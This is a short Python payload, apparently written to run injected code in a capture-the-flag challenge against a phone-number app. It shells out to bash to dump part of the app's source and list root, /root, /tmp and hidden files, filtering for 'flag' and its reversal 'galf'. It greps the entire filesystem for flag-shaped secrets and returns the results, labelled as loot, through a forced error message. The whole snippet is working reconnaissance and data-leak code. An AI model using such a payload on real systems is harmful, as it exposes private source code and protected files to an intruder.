import subprocess, sys
out = subprocess.run(["bash","-c",
  "echo '== main.py 90-180 =='; sed -n '90,180p' /app/src/phonenumber/main.py; "
  "echo '== root-owned recent files =='; ls -la / /root /tmp 2>/dev/null | grep -iE 'txt|galf|flag'; "
  "echo '== hidden in / =='; ls -la /.* 2>/dev/null | grep -iE 'galf|txt|flag'; "
  "echo '== grep galf/flag content =='; grep -raoE '[A-Za-z0-9_]{2,15}\\{[^}]{3,90}\\}' / 2>/dev/null | grep -ivE 'site-packages|dist-packages|/proc/|/sys/|pip-install' | head -20"
], capture_output=True, text=True)
raise SystemExit("LOOT_START\n" + out.stdout + out.stderr + "\nLOOT_END")
